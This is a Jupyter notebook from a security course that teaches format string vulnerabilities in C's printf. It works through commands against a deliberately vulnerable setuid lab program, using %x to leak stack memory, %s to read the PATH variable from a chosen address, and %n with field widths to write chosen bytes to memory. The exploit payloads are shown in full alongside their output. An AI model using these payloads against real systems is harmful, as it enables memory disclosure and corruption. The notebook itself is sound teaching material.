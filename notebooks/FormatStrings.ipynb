{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Format Strings\n",
    "http://www.cplusplus.com/reference/cstdio/printf/?kw=printf\n",
    "\n",
    "- `printf()` in C/C++ can be used to print fixed strings, variables in many different formats\n",
    "- other cstring functions that uses format strings are: `fprintf`, `sprintf`, `scanf`, `fscanf`, `sscanf`\n",
    "- hello.cpp program below uses `printf()` incorrectly!\n",
    "- \"Good Bye World!\\n\" string technically is the format string (devoid of special escape sequences called format parameters)\n",
    "- format parameters begins with a `%` sign; for each format parameter (%) function expects arguments\n",
    "- format specifier follows this prototype:\n",
    "`%[flags][width][.precision][length]specifier`\n",
    "\n",
    "- following parameter requires values/variables as arguments\n",
    "\n",
    "| Parameter | Output Type |\n",
    "| --- | --- |\n",
    "| %d | Decimal |\n",
    "| %u | Unsigned decimal |\n",
    "| %x | Hexadecimal |\n",
    "\n",
    "- the following parameters expect pointers/addresses as arguments\n",
    "\n",
    "| Parameter | Output Type |\n",
    "| --- | --- |\n",
    "| %s | String |\n",
    "| %n | Number of bytes written so far |\n",
    "| %p | Memory address |\n",
    "\n",
    "- `%s` - reads the data pointed to by the address/pointer provided as an argument\n",
    "- `%n` is intriguing parameter as it expectes integer address and writes number of bytes written so far to starndard output to that address!\n",
    "    - what could potentially go wrong here?!!...\n",
    "\n",
    "- `%s` and `%n` are the focus of this notebook"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%cd ../demos"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%cat hello.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! g++ -m32 -std=c++20 -o hello.exe hello.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./hello.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Format Parameters Examples\n",
    "- let's look into fmt_strings.cpp program to see common usage of format strings and parameters"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%cd fmt_strings"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat fmt_strings.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! g++ -m32 -o fmt_strings.exe fmt_strings.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! g++ -m32 -Wall -o fmt_strings.exe fmt_strings.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ../../demos/compile.sh ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "input=\"fmt_strings.cpp\"\n",
    "output=fmt_strings.exe\n",
    "echo kali | sudo -S ./compile.sh $input $output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# note high value for A: -ve value is stored using two's complement\n",
    "! ./fmt_strings.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Format Parameter `%n`\n",
    "\n",
    "- `%n` - uncommon, but let's understand how it works\n",
    "- `%n` - takes pointer argument; writes the number of bytes written so far to the corresponding variable's address"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "cat fmt_uncommon.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "input=\"fmt_uncommon.cpp\"\n",
    "output=fmt_uncommon.exe\n",
    "echo kali | sudo -S ./compile.sh $input $output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./fmt_uncommon.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Stack frame of printf( )\n",
    "- let's look at the stack frame of `printf()` right after it is called in fmt_uncommon.cpp\n",
    "- look at the last printf()\n",
    "\n",
    "#### printf(\"A is %d and is at %08x.  B is %x.\\n\", A, &A, B);\n",
    "- hint: arguments are pushed in reverse order (last argument first)\n",
    "\n",
    "\n",
    "|Top of the stack (lower address)|\n",
    "| :----: |\n",
    "| local variable |\n",
    "| EBP of main |\n",
    "| return address to main |\n",
    "| Address of format string (first argument)|\n",
    "| Value of A |\n",
    "| Address of A |\n",
    "| Value of B |\n",
    "| ... |\n",
    "| Stack frame of main |\n",
    "| Bottom of the Stack (higher address) |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### what if?\n",
    "- what happens if fewer arguments are passed to printf()?\n",
    "    - what kind of error happens: syntax error? logical error? run-time error?\n",
    "- e.g,: `printf(\"A is %d and is at %08x. B is %x.\\n\", A, &A);`\n",
    "- what if no arguments are provided to format parameters of the printf() \n",
    "    - no argument is provided to the last parameter `%x` parameter, e.g.\n",
    "- fmt_uncommon2.cpp provided in demos/fmt_strings/fmt_uncommon2.cpp demonstrates just this\n",
    "- fmt_uncommon2.cpp is essentially same as fmt_uncommon.cpp file except in one line"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# see the difference between the fmt_uncommon.cpp and fmt_uncommon2.cpp\n",
    "! diff fmt_uncommon.cpp fmt_uncommon2.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "# let's compile the fmt_uncommon2.cpp file\n",
    "input=fmt_uncommon2.cpp\n",
    "output=fmt_uncommon2.exe\n",
    "\n",
    "echo kali | sudo -S ./compile.sh $input $output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# execute the program\n",
    "! ./fmt_uncommon2.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Note the value of B\n",
    "- Is that the correct value of B? So, what happend?\n",
    "- since there's no corresponding argument for third `%x`, it pulled some value stored in the location where the third argument was supposed to be on the stack\n",
    "- this is the value found below the stack frame of the printf function\n",
    "- as a result, program read data from memory that it's not supposed to\n",
    "    - violation of confidentialy and integrity of the data/program\n",
    "\n",
    "## The Format String Vulnerability\n",
    "- if string variable is printed directly `printf(c_string)` instead of `printf(\"%s\", c_string)`\n",
    "    - if the value of string variable can't be trusted; usually user provided or received externally from another program, network, file, etc.\n",
    "- let's demonstrate the format string vulnerability using `fmt_vuln.cpp` program in `demos/fmt_strings/vuln1/` folder"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "# change working directoroy to vuln1 folder\n",
    "%cd fmt_strings/vuln1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat fmt_vuln.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's compile the file using the provided Makefile\n",
    "! echo kali | sudo -S make"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# make sure ownership is changed to root and SETEUID is set\n",
    "! ls -al fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# run fmt_vuln.exe\n",
    "! ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./fmt_vuln.exe \"testing 124 abc #\\$$556\"\n",
    "# Note $ has special meaning to printf() function; you'll see the usage below"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# what if you provide %s as value\n",
    "! ./fmt_vuln.exe \"testing%s\"\n",
    "# notice the repeating of the argument itself!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Control the Input String\n",
    "- we see `%s` provided in the input string prints itself\n",
    "- if `%s` is forced to print string from arbitrary address, you'll crash the program!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's see what %x prints!\n",
    "! ./fmt_vuln.exe \"AAAA%x\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# when program crashes, the vulnerable printf() function \n",
    "# chokes and doesn't print anything\n",
    "! ./fmt_vuln.exe \"AAAA%s\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's check if it crashes now\n",
    "! ./fmt_vuln.exe \"AAAA%s%s%s\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's check if it crashes now\n",
    "! ./fmt_vuln.exe \"AAAA%s%s%s%s\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# you can seed things up...\n",
    "! ./fmt_vuln.exe $(python -c 'print(\"AAAA%s.\"*50)')\n",
    "# the rest of the output is not printed due to run-time exception"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Let's Use %x Parameter\n",
    "- recall, `%x` parameter formats the argument in Hex\n",
    "- what if you provide `%x` as part of data?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./fmt_vuln.exe AAAA%x%x%x%x%x\n",
    "# note the address of text..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# process can be reapeated to examine stack memory below at the higher addresses\n",
    "# just provide a lot of format parameter as hex and see what's on stack\n",
    "! ./fmt_vuln.exe $(python -c 'print(\"AAAA\" + \"%08x.\"*40, end=\"\")')\n",
    "# Note: as more data is passed to the program, text address shifts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# notice a bunch of 2e78383025 are repeated\n",
    "# each four bytes values are reversed due to little-endian architecture\n",
    "! python -c 'print(\"\\x25\\x30\\x38\\x78\\x2e\")'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# try to print the same output as string\n",
    "! ./fmt_vuln.exe $(python -c 'print(\"%s.\"*40)')\n",
    "# the program crashes..."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Read from Arbitrary Memory Address\n",
    "- `%s` format parameter can be used to read from arbitrary memory addresses\n",
    "- part of the format string can be used to supply controlled address to the `%s` format parameter\n",
    "- if a valid memory address is used, this process could be used to read a string found at that memory address\n",
    "\n",
    "### Environment variables are loaded into each program's memory\n",
    "\n",
    "- we'll use demos/stack_overflow/getenvaddr.cpp to get address of an env variable\n",
    "- use the PATH variable's address as an argument for `%s`\n",
    "    - essentially force the program to print the value of PATH variable\n",
    "    \n",
    "```bash\n",
    "$ ./fmt_vuln.exe $(print \"\\x address in reverse bytes\")%08x-%08x-%08x-%s\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# provide a bunch of %08x as a part of string to see where the first string repeats\n",
    "! ./fmt_vuln.exe AAAABBBB-%08x-%08x-%08x-%08x-%08x\n",
    "# notice that fourth parameter is repeating from begnning of the format string \n",
    "# AAAA is 4th parameter"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# try printing the AAAA as %s\n",
    "! ./fmt_vuln.exe AAAA%08x-%08x-%08x-%x"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- why do we get segfault?\n",
    "- it's attempting to print string at the address AAAA \n",
    "- recall `%s` needs address of c-string parameter\n",
    "- how about we provide some valid memory address instead of AAAA?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PATH=/home/kali/miniconda3/bin:/home/kali/miniconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games\r\n"
     ]
    }
   ],
   "source": [
    "! env | grep $PATH"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's copy getenvaddr.cpp file from demos/... into the current folder\n",
    "! cp ../../stack_overflow/getenvaddr.cpp ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# compile and run getevnaddr.cpp to find the memory \n",
    "# address of env variables wrt  programs\n",
    "! cat getenvaddr.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "input=\"getenvaddr.cpp\"\n",
    "output=\"getenvaddr.exe\"\n",
    "g++ -m32 -o $output $input"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PATH will be at 0xffffc260 with reference to ./fmt_vuln.exe\r\n"
     ]
    }
   ],
   "source": [
    "# find address of PATH variable wrt fmt_vuln.exe\n",
    "! ./getenvaddr.exe PATH ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "`���%08x-%08x-%08x-%s\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "`���ffffb900-00000000-080491b0-/home/kali/miniconda3/bin:/home/kali/miniconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c01c = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffb900\r\n"
     ]
    }
   ],
   "source": [
    "# let's try to read the value of PATH using fmt_vuln.exe\n",
    "! ./fmt_vuln.exe $(printf \"\\x60\\xc2\\xff\\xff\")%08x-%08x-%08x-%s"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "`���"
     ]
    }
   ],
   "source": [
    "# you can use python or pwntools to change the byte order\n",
    "# so you don't have to write in reverse oder in hex format\n",
    "! python -c 'import sys; sys.stdout.buffer.write((0xffffc260).to_bytes(4, byteorder=\"little\"))'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "`���%08x-%08x-%08x-%s\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "`���ffffb900-00000000-080491b0-/home/kali/miniconda3/bin:/home/kali/miniconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c01c = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffb900\r\n"
     ]
    }
   ],
   "source": [
    "# let's try to read the value of PATH using fmt_vuln.exe using python\n",
    "! ./fmt_vuln.exe $(python -c 'import sys; sys.stdout.buffer.write((0xffffc260).to_bytes(4, byteorder=\"little\"))')%08x-%08x-%08x-%s"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! pip install -U pwntools"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "`���%08x-%08x-%08x-%s\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "`���ffffb900-00000000-080491b0-/home/kali/miniconda3/bin:/home/kali/miniconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c01c = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffb900\r\n"
     ]
    }
   ],
   "source": [
    "# let's try to read the value of PATH using fmt_vuln.exe using python\n",
    "! ./fmt_vuln.exe $(python -c 'import sys; from pwn import p32; sys.stdout.buffer.write(p32(0xffffc260))')%08x-%08x-%08x-%s"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Notice if part of variable name PATH= is missing from the value /home/user/...\n",
    "- we overshot the address by 5 bytes\n",
    "- we can stubtract (# of missing characters); essentially reducing the PATH address by 5 bytes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ffffc25b"
     ]
    }
   ],
   "source": [
    "# can subtract from the complete address\n",
    "! printf \"%x\" $((0xffffc260-5))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5b\n"
     ]
    }
   ],
   "source": [
    "# or just substract from the leaset significant byte\n",
    "# using Python\n",
    "print(f\"{0x60-5:x}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "[���%08x-%08x-%08x-%s\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "[���ffffb900-00000000-080491b0-PATH=/home/kali/miniconda3/bin:/home/kali/miniconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c01c = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffb900\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_vuln.exe $(python -c 'import sys; sys.stdout.buffer.write((0xffffc25b).to_bytes(4, byteorder=\"little\"))')%08x-%08x-%08x-%s\n",
    "# now we see our complete path"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Write to Arbitrary Memory Address\n",
    "\n",
    "- Recall that:\n",
    "    - `%s` - can be used to read as string pointed to by an memory address\n",
    "    - `%x` - can be used to read an memory address as Hex\n",
    "    - `%n` - can be used to write (integer value) to memory address\n",
    "\n",
    "- note that `test_val` variable has been printing its address and value in the debug statement\n",
    "- what if we provide the address of test_val for our `%n` parameter?\n",
    "\n",
    "```bash\n",
    "$ fmt_vuln.exe $(printf \"\\x reverse address of test_val\")-%08x-%08x-%08x-%n\n",
    "```\n",
    "\n",
    "- however, the resulting value in the `test_val` variable depends on the number of bytes written before the `%n`\n",
    "- this can be controlled to a a greater degree by manipulating the field **WIDTH** option so we don't have to print a larger number of actual characters to write something more meaningful such as memory address to `test_val`\n",
    "\n",
    "```bash\n",
    "$ fmt_vuln.exe $(printf \"\\x reverse address of test_val\")-%x-%x-%x-%n\n",
    "$ fmt_vuln.exe $(printf \"\\x reverse address of test_val\")-%x-%x-%100x-%n\n",
    "$ fmt_vuln.exe $(printf \"\\x reverse address of test_val\")-%x-%x-%400x-%n\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAA%x%x%x%x\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "AAAAffffb910080491b041414141\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c01c = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffb910\r\n"
     ]
    }
   ],
   "source": [
    "# let's note the address of test_val\n",
    "! ./fmt_vuln.exe AAAA%x%x%x%x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "\u001c",
      "�\u0004\b-%08x-%08x-%08x-%n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "\u001c",
      "�\u0004\b-ffffb900-00000000-080491b0-\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c01c = 32 0x00000020\r\n",
      "[*] text is @ 0xffffb900\r\n"
     ]
    }
   ],
   "source": [
    "# use the address of test_val to write to for %n parameter\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08\")-%08x-%08x-%08x-%n\n",
    "# Note test_val: which is the total bytes written thus far by printf()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "\u001c",
      "�\u0004\b-%x-%x-%x-%n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "\u001c",
      "�\u0004\b-ffffb910-0-80491b0-\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c01c = 24 0x00000018\r\n",
      "[*] text is @ 0xffffb910\r\n"
     ]
    }
   ],
   "source": [
    "# value can be controlled by manipulating the field width of arguments before it\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08\")-%x-%x-%x-%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "\u001c",
      "�\u0004\b-%x-%x-%100x-%n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "\u001c",
      "�\u0004\b-ffffb900-0-                                                                                             80491b0-\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c01c = 117 0x00000075\r\n",
      "[*] text is @ 0xffffb900\r\n"
     ]
    }
   ],
   "source": [
    "# value can be controlled by manipulating the field width of arguments before it\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08\")-%x-%x-%100x-%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "\u001c",
      "�\u0004\b-%x-%284x-%400x-%n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "\u001c",
      "�\u0004\b-ffffb900-                                                                                                                                                                                                                                                                                           0-                                                                                                                                                                                                                                                                                                                                                                                                         80491b0-\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c01c = 700 0x000002bc\r\n",
      "[*] text is @ 0xffffb900\r\n"
     ]
    }
   ],
   "source": [
    "# value can be controlled by manipulating the field width of arguments before it\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08\")-%x-%284x-%400x-%n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Write User-Controlled Values (0xaddress)\n",
    "\n",
    "- the above trick (manipulating width) works for small numbers but won't work for large ones like memory addresses\n",
    "- let's write 0xDDCCBBAA to variable `test_val`; let's say the test_val which is at 0x0804c01c` \n",
    "\n",
    "- 0xAA goes to least significant byte, 0xBB to next byte and so on and 0xDD goes to the most significant byte\n",
    "- $ 0xAA \\rightarrow 1^{st} byte$\n",
    "- $ 0xBB \\rightarrow 2^{nd} byte$\n",
    "- $ 0xCC \\rightarrow 3^{rd} byte$\n",
    "- $ 0xDD \\rightarrow 4^{th} byte$\n",
    "\n",
    "| Memory address | Value |\n",
    "| --- | --- |\n",
    "| 0x0804c01c | AA |\n",
    "| 0x0804c01d | BB |\n",
    "| 0x0804c01e | CC |\n",
    "| 0x0804c01f | DD |"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "\u001c",
      "�\u0004\b-%x-%x-%8x-%n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "\u001c",
      "�\u0004\b-ffffb900-0- 80491b0-\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c01c = 25 0x00000019\r\n",
      "[*] text is @ 0xffffb900\r\n"
     ]
    }
   ],
   "source": [
    "# find out the width value to print 0xaa in the right location\n",
    "# 8 is used to standarize the output (8 hex characters, 4 bytes); \n",
    "# less than 8 is not enough width and is ignored by printf() \n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08\")-%x-%x-%8x-%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "137"
     ]
    }
   ],
   "source": [
    "# 0xaa is the goal; 25 is what 8 width provides\n",
    "! printf \"%d\" $(( 0xaa-25 + 8))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "153\n"
     ]
    }
   ],
   "source": [
    "# or use python\n",
    "print(0xaa-25+8)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "\u001c",
      "�\u0004\b-%x-%x-%153x-%n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "\u001c",
      "�\u0004\b-ffffb900-0-                                                                                                                                                  80491b0-\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c01c = 170 0x000000aa\r\n",
      "[*] text is @ 0xffffb900\r\n"
     ]
    }
   ],
   "source": [
    "# replace width 8 with the resulting value\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08\")-%x-%x-%153x-%n\n",
    "# test_val = 0x000000aa\n",
    "# we've aa least significant byte in right the place"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Writing to rest of the bytes (3-bytes) memory address\n",
    "\n",
    "- if we write all 4-btyes memory locations next to each other, we can't control the value to be written at that location\n",
    "- we need to add some text (4-bytes JUNK) separator to our input payload that can help us provide the width to control what value to print to the next byte location\n",
    "- our final payload will have the following structure:\n",
    "\n",
    "```\n",
    "[Add 0th]JUNK[Add 1st]JUNK[Add 2nd]JUNK[Add 3rd]-%x-%x-%[W]x%n%[W]x%n%[W]x%n%[W]x%n\n",
    "```\n",
    "- e.g., wan't to write 4 bytes beginning at the memory address `0x... 1c`, we'd try to do the following:\n",
    "\n",
    "| Memory address | format specifier | Final Value |\n",
    "| --- | --- | -- |\n",
    "| memory | %[w]x | hex |\n",
    "| 0x...1c | %n | AA |\n",
    "| JUNK | %[w]x | hex |\n",
    "| 0x...1d | %n | BB |\n",
    "| JUNK | %[w]x | hex |\n",
    "| 0x...1e | %n | CC |\n",
    "| JUNK | %[w]x | hex |\n",
    "| 0x...1f | %n | DD |"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# next write 0xbb, 0xcc, and 0xdd\n",
    "# need 3 more %x%n format to write to each byte of addresses\n",
    "# since %x needs some 4 bytes to write, we can provide anything such as JUNK\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08JUNK\\x1d\\xc0\\x04\\x08JUNK\\x1e\\xc0\\x04\\x08JUNK\\x1f\\xc0\\x04\\x08\")-%x-%x-%8x%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# find the width to be used so the final value is 0xaa\n",
    "! echo $(( 0xaa-55+8 ))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# replace width 8 width with the result to write 0xaa\n",
    "! ./fmt_vuln.exe $(printf \"\\x1c\\xc0\\x04\\x08JUNK\\x1d\\xc0\\x04\\x08JUNK\\x1e\\xc0\\x04\\x08JUNK\\x1f\\xc0\\x04\\x08\")-%x-%x-%123x%n"
